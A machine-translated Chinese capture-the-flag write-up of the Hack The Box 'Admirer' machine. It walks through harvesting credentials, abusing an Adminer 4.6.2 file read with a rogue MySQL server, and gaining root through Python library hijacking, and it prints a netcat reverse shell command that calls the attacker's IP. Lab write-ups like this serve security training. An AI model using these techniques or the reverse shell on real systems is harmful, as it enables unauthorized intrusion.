<html>
<head>
<title>HTB Admirer [Writeup]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB的崇拜者</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-admirer-writeup-171abd8d399c?source=collection_archive---------1-----------------------#2020-09-28">https://infosecwriteups.com/htb-admirer-writeup-171abd8d399c?source=collection_archive---------1-----------------------#2020-09-28</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="c9cd" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">敏感文件泄露| Python库劫持</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi ki"><img src="../Images/6bee9c571b639b32f2a85a8e40192906.png" data-original-src="https://miro.medium.com/v2/resize:fit:1172/format:webp/1*wH-r4b8ianduGWjPucZUpQ.png"/></div></figure><h1 id="3d7b" class="kq kr it bd ks kt ku kv kw kx ky kz la jz lb ka lc kc ld kd le kf lf kg lg lh bi translated"><strong class="ak">总结:</strong></h1><p id="80a1" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">对于该机器，使用<code class="fe me mf mg mh b">gobuster</code>命令暴露了访问开放FTP端口的凭据，这导致发现了易受攻击的MySQL数据库，该数据库允许外部服务器导入暴露凭据的任意数据。也就是说，您可以实现一个本地数据库和表，授予完全权限，并将其连接到易受攻击的MYSQL数据库。</p><p id="9c16" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">对于root用户，发现一个脚本使用<code class="fe me mf mg mh b">sudo</code>命令作为root用户执行。查看脚本代码后，Python库劫持技术被尝试提升权限以获取root用户。</p><h2 id="ce33" class="mn kr it bd ks mo mp dn kw mq mr dp la lr ms mt lc lv mu mv le lz mw mx lg my bi translated">使用的工具:</h2><ul class=""><li id="8718" class="mz na it lk b ll lm lo lp lr nb lv nc lz nd md ne nf ng nh bi translated"><code class="fe me mf mg mh b">Nmap</code></li><li id="0ac0" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated"><code class="fe me mf mg mh b">gobuster</code></li><li id="11eb" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated"><code class="fe me mf mg mh b">gunzip</code>和<code class="fe me mf mg mh b">tar -xvf</code></li><li id="35ef" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated"><code class="fe me mf mg mh b">mysql -h localhost -u &lt;username&gt; -p</code></li><li id="2be4" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated"><code class="fe me mf mg mh b">sudo -l</code></li><li id="0afa" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated"><code class="fe me mf mg mh b">nc</code></li><li id="ba70" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated">自定义python脚本漏洞利用</li></ul></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="e46f" class="kq kr it bd ks kt nu kv kw kx nv kz la jz nw ka lc kc nx kd le kf ny kg lg lh bi translated">列举</h1><p id="2054" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk iu"> Nmap TCP输出</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi nz"><img src="../Images/479a1c2384c26501fafe77e074e3d3ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UBtO5cka8AY4inS2cTScTg.png"/></div></div></figure><p id="9535" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated"><strong class="lk iu">* * * * * * * * * * * *端口80 HTTP * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><p id="ac7a" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">在robots.txt文件中找到了<strong class="lk iu"> /admin-dir </strong>目录。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi oe"><img src="../Images/84c902ac6be8dd471afad50c9570f9ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uduCk65ww4zngluae-Iu9g.png"/></div></div></figure><p id="79c8" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">看起来/admin-dir有些有趣的东西。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi of"><img src="../Images/2ba903d7fe5d5abeca5d5dec80199f2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fpAA-aMWcoTzXMb4iMqtmg.png"/></div></div></figure><p id="c346" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">我运行<code class="fe me mf mg mh b">gobuster</code>来查找<strong class="lk iu"> /admin-dir </strong>目录中的内容，但是没有一个wordlist脚本能够找到另一个子目录。</p><p id="8143" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated"><strong class="lk iu"> <em class="og">注意:</em> </strong> <em class="og">在robots.txt文件内，Waldo提到/admin-dir包含' contact '和' creds '。</em></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi oh"><img src="../Images/846bc40a5e502c0a5ad66f1f721a3cb5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HI91muU4Uo6-_zfN5CD7RQ.png"/></div></div></figure><p id="fa23" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated"><strong class="lk iu">‘contacts . txt’</strong>和<strong class="lk iu"> credentials.txt </strong>文件包含用户名和密码。</p><p id="7fc9" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated"><strong class="lk iu">* * * * * * * * * * * *端口21 FTP * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><p id="e22e" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">我们知道ftp端口是打开的，所以我们可以使用它的凭证登录。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi oi"><img src="../Images/0d2d5cc1d196bce178ecb1c801255fa8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qvb8DfKz0Jd5zJwLxSUpsQ.png"/></div></div></figure><p id="0d42" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">输入<code class="fe me mf mg mh b">get dump.sql</code>和<code class="fe me mf mg mh b">get html.tar.gz</code>命令下载这些文件。</p><p id="df88" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">使用命令提取<strong class="lk iu">html.tar.gz</strong>文件的内容:</p><blockquote class="oj ok ol"><p id="2457" class="li lj og lk b ll mi ju ln lo mj jx lq om mk lt lu on ml lx ly oo mm mb mc md im bi translated"><code class="fe me mf mg mh b">gunzip html.tar.gz</code></p><p id="8c37" class="li lj og lk b ll mi ju ln lo mj jx lq om mk lt lu on ml lx ly oo mm mb mc md im bi translated"><code class="fe me mf mg mh b">tar -xvf html.tar</code></p></blockquote><p id="4c31" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated"><strong class="lk iu">你得到:</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi op"><img src="../Images/0f79875cb9a908ac0723ebbf10ec680f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v2HmMORtg5RGHU-lI1Fe4g.png"/></div></div></figure><p id="fcb8" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">在查看所有的<strong class="lk iu">子目录</strong>时，我注意到在<strong class="lk iu">实用程序脚本</strong>文件夹中的<strong class="lk iu"> db_admin.php </strong>中有一些东西，请阅读以下注释:</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi oq"><img src="../Images/dcecff307b36f95fb0bc9e7400014a1e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZYDrn-5bWtAaw0mrA0zSkg.png"/></div></div></figure><p id="a414" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">查看下面来自<a class="ae or" href="https://www.w3schools.com/php/php_mysql_create.asp" rel="noopener ugc nofollow" target="_blank"> w3schools </a>的<strong class="lk iu">示例db_admin.php </strong>，我们可以看到<strong class="lk iu">‘database’</strong>名称缺少<strong class="lk iu">，因为它不是在db_admin.php下创建的。</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi os"><img src="../Images/398322c74501b085b11e25608fe9902c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CO5K7vVz2ZsU9s-gLGiKRA.png"/></div></div></figure><p id="9016" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">基本上<strong class="lk iu">&lt;DatabaseLoginPortalName&gt;。php </strong>不见了。我们在<strong class="lk iu"> /utility-scripts中使用<code class="fe me mf mg mh b">gobuster </code>运行一个搜索。</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi ot"><img src="../Images/c4613a09006c2219e04ab8c7d3c8570b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1Iykssp0wDkV4CiqhUQZpw.png"/></div></div></figure><p id="3471" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">找到的<strong class="lk iu">数据库登录门户</strong>名称为<strong class="lk iu">adminer.php</strong></p><p id="2114" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated"><strong class="lk iu"> <em class="og">注:</em> </strong> <em class="og">管理员版本4.6.2 </em></p><p id="c1da" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">由于未创建数据库，找到的所有凭据都不适用于此数据库登录门户。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi ou"><img src="../Images/6bdd55444195b6a39a0d0345aee4ca1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ox-cFGv2CT_hXsIglmE2kw.png"/></div></div></figure></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="9d44" class="kq kr it bd ks kt nu kv kw kx nv kz la jz nw ka lc kc nx kd le kf ny kg lg lh bi translated"><strong class="ak">立足点</strong></h1><p id="310a" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><a class="ae or" href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability" rel="noopener ugc nofollow" target="_blank"> <strong class="lk iu">管理员版本4.6.2 </strong> </a>易受错误配置系统的攻击，攻击者会让管理员连接到其本地mysql服务器。该网站引用“Adminer然后将连接到外部服务器，使用凭证登录，并立即从服务器接收特定文件的数据导入请求。”</p><p id="6f51" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated"><strong class="lk iu">在攻击者机器上运行以下命令:</strong></p><ul class=""><li id="5f1c" class="mz na it lk b ll mi lo mj lr ov lv ow lz ox md ne nf ng nh bi translated"><code class="fe me mf mg mh b">sudo service mysql start</code></li><li id="b717" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated"><code class="fe me mf mg mh b">sudo mysql</code></li></ul><p id="e693" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">登录后，创建用户并授予我们将创建的新数据库的所有权限。</p><ul class=""><li id="a284" class="mz na it lk b ll mi lo mj lr ov lv ow lz ox md ne nf ng nh bi translated"><code class="fe me mf mg mh b">CREATE DATABASE admirerExposed;</code></li><li id="6732" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated"><code class="fe me mf mg mh b">SHOW DATABASES;</code></li><li id="4046" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated"><code class="fe me mf mg mh b">USE admirerExposed;</code></li><li id="e168" class="mz na it lk b ll ni lo nj lr nk lv nl lz nm md ne nf ng nh bi translated"><code class="fe me mf mg mh b">CREATE TABLE tableTEST(columnTest varchar(5000));</code></li></ul><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi oy"><img src="../Images/51deec48d452c9e31723dd8e2ded8c79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xjlLjAuchV6mzmgcs_AagA.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi oz"><img src="../Images/dc7c32facd2b6f72e188625e48fe531f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qij_dndOGgezNrahT_r9yg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pa"><img src="../Images/ab8c8281cba7c66678e9793c3e682d0b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6RNu0giTmvDRkIn7aayHmg.png"/></div></div></figure><p id="de42" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">mysql的下一步:</p><p id="14e1" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated"><code class="fe me mf mg mh b">GRANT ALL PRIVILEGES ON admirerExposed.* TO ‘testName’@’%’ IDENTIFIED BY ‘testPassword’;</code></p><p id="6e44" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">使用命令<code class="fe me mf mg mh b">SELECT user FROM mysql.user;</code>检查用户列表</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pb"><img src="../Images/cebffb3a8a3143eb150c8b3d3eb60d78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L2WpcyqtouMLaSpg76HXPw.png"/></div></div></figure><p id="79b6" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">现在在<strong class="lk iu">/etc/MySQL/Maria db . conf . d/50-server . CNF</strong>文件中，将<strong class="lk iu">绑定地址</strong>更改为<strong class="lk iu"> 0.0.0.0 </strong>以允许来自远程主机的连接。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pc"><img src="../Images/22c1f897fa171a175742ab65c3049b0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mBOX3qgIMrF2QGbqu2AHyA.png"/></div></div></figure><p id="9754" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">最后，来自mysql的<code class="fe me mf mg mh b">exit</code>和<code class="fe me mf mg mh b">sudo service mysql restart</code></p><p id="f722" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">现在，运行一个测试，看看通过'<strong class="lk iu"> localhost </strong>和'<strong class="lk iu"> remote server </strong>登录是否有效，因为我们使用了通配符<code class="fe me mf mg mh b"><strong class="lk iu">%</strong></code> <strong class="lk iu"> </strong>，它允许从任何远程主机<strong class="lk iu"> </strong>连接。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pd"><img src="../Images/94f60a1c684c8a078ad409c16f622a35.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uZkcHuBCfqbbx_2z9r07bQ.png"/></div></div></figure></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="6652" class="kq kr it bd ks kt nu kv kw kx nv kz la jz nw ka lc kc nx kd le kf ny kg lg lh bi translated"><strong class="ak">反壳</strong></h1><p id="3b84" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">下面，我使用HTB的IP地址10.10.14.42作为我修改后的mysql服务器。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pe"><img src="../Images/116182761899c12b38a554ffb495c9e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PbUrvFnpaSk4jNoMI08Pgw.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pf"><img src="../Images/756d133ac78987ead1e3e6eb2ef448fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h43GEa8rMrcQg-VS3qPUsA.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pg"><img src="../Images/209a6d6c5553d876fa31d541fa3fa264.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*BjtTVmkLzzfZaml6nWKXDg.gif"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi ph"><img src="../Images/45c76d2b36cec07e344acd638485f1dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-BXLEFE3oFSPo1z2_BP9aQ.png"/></div></div></figure></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h2 id="1d7d" class="mn kr it bd ks mo mp dn kw mq mr dp la lr ms mt lc lv mu mv le lz mw mx lg my bi translated">权限提升</h2><p id="aff9" class="pw-post-body-paragraph li lj it lk b ll lm ju ln lo lp jx lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">现在我们有了用户，通过一些基本的检查，我们可以看到<em class="og">/opt/scripts/admin _ tasks . sh</em>已经被授权通过<code class="fe me mf mg mh b">sudo</code>命令作为根用户执行。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pi"><img src="../Images/93f4f622008aa552a299a9c73da7f19b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NbLoVML28P2QBFtRUWCA8Q.png"/></div></div></figure><p id="7ddd" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">在没有<code class="fe me mf mg mh b">sudo</code>命令的情况下运行脚本，看看它是如何工作的，然后用<code class="fe me mf mg mh b">sudo</code>命令运行。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pj"><img src="../Images/061aa43a918799b67efaf43274897d75.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mE31l5Vcx3ETObyUSruZpg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi of"><img src="../Images/108be765192706b965f0abe34e5c0586.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*71D1ePIjT_Dj5BPYktl6aA.png"/></div></div></figure><p id="fc81" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">在<em class="og"> admin_task.sh </em>代码中，我们可以看到'<em class="og"> backup_web </em>'函数正在调用<em class="og"> /opt/scripts/backup.py </em>脚本并执行它。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pk"><img src="../Images/0dc7bd8b6652c548ce5ad5564af8b62a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ulPLZIG-ONBM8qoKLNtwVg.png"/></div></div></figure><p id="c341" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">查看下面的脚本，<a class="ae or" href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/" rel="noopener ugc nofollow" target="_blank"> Python库劫持</a>文章通过光栅化提到了如何伪造类似的Python库文件名以包含恶意模块来提升权限。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pl"><img src="../Images/629b549c1cd46f818935b555f3887168.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W7Hlr9My1_h15EBGXta-Hg.png"/></div></div><figcaption class="pm pn gj gh gi po pp bd b be z dk translated">后援。当用户点击数字6时，备份Web数据调用的PY脚本。</figcaption></figure><p id="87a8" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">创建一个简单的反向shell脚本:<code class="fe me mf mg mh b">nc 10.10.14.42 6765 -e "/bin/sh"</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pq"><img src="../Images/f149aa6b821e1b7623b169a00fe3dacd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XIcUC3o4IicxX_TxVe_VVg.png"/></div></div><figcaption class="pm pn gj gh gi po pp bd b be z dk translated">恶意库文件“SHUTIL。“PY”被创建，并在备份的模块“MAKE_ARCHIVE()”中包含恶意负载。PY导入并执行。</figcaption></figure><p id="e346" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated"><code class="fe me mf mg mh b">sudo PYTHONPATH=/tmp/ko /opt/scripts/admin_tasks.sh</code></p><p id="6663" class="pw-post-body-paragraph li lj it lk b ll mi ju ln lo mj jx lq lr mk lt lu lv ml lx ly lz mm mb mc md im bi translated">当用户使用<code class="fe me mf mg mh b">sudo</code>命令执行<em class="og">opt/scripts/admin _ tasks . sh</em>并输入‘6’(备份Web数据)时，执行/opt/scripts/backup.py脚本，然后使用给定路径<code class="fe me mf mg mh b">PYTHONPATH=/tmp/ko</code>调用python库文件‘shutil . py’并导入定制的恶意模块‘make _ archive()’。这就是执行/bin/bash的方式，我们得到如下所示的shell。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pr"><img src="../Images/c96a0b340a36ff4829f9e2e94c6d6867.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*FsRJxRFLKEhAp-Ca8dw_1g.gif"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi ps"><img src="../Images/4c77f8f448d7c45cfff909e5399d0d0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1252/format:webp/1*uKWMPkti5CguAnFw8e8DoA.png"/></div></figure></div></div>    
</body>
</html>